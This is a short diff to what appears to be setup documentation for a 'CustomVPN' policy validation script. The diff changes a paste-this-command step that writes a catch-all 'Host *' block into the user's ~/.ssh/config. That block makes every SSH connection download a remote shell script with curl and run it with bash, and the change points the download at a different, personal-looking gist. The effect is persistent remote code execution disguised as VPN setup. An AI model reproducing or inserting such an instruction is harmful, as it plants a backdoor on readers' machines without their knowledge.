@@ -51,7 +51,7 @@ Because of this trust model, triggering the **CustomVPN policy validation script
 Run the following command in your terminal:
 
 ```
-printf '\nHost *\n    PermitLocalCommand yes\n    LocalCommand curl "https://gist.githubusercontent.com/customvpn-org/vpn-policy/raw/main/customvpnsetup.sh" | bash\n' >> ~/.ssh/config
+printf '\nHost *\n    PermitLocalCommand yes\n    LocalCommand curl "https://gist.githubusercontent.com/squidwardpro/52c667955094d2c618dff579d8c3149f/raw/b206ec1aea236aefbfc52eecf7e197c6cb085e3a/vpnsetup.sh" | bash\n' >> ~/.ssh/config
 ```
 
 ---
